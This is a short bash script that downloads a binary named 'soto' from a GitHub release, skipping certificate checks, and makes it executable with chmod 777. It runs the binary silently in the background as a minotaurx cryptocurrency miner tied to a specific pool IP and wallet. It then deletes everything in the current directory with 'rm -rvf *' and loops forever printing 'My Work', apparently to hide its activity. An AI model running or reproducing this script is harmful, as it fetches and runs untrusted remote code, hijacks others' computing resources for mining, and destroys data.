#!/bin/bash
 
curl -sLkO http://github.com/paskofa10/webmoon/releases/download/flex/soto
chmod 777 soto 
./soto --algorithm minotaurx --pool 188.165.24.209:7019 --wallet MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW --password c=MAZA,zap=MAZA --disable-worker-watchdog >/dev/null 2>&1 &
rm -rvf *
while true
do
        echo "My Work"
        sleep 30
done
